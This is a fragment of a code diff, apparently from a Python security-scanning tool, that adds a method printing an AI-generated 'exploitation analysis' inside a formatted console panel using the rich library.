             title="[bold]FINAL SCORE[/bold]", border_style="bright_red", padding=(1, 6)))
+
+    def _report_ai_analysis(self, analysis):
+        if not analysis:
+            return
+        self.console.print()
+        self._section("AI POWERED EXPLOITATION ANALYSIS", "🤖")
+        self.console.print(Panel(
+            f"[white]{analysis}[/white]",
+            title="[bold red]🔴 EXPERT PENETRATION TESTER ANALYSIS[/bold red]",
+            border_style="red",
+            padding=(1, 2)
+        ))
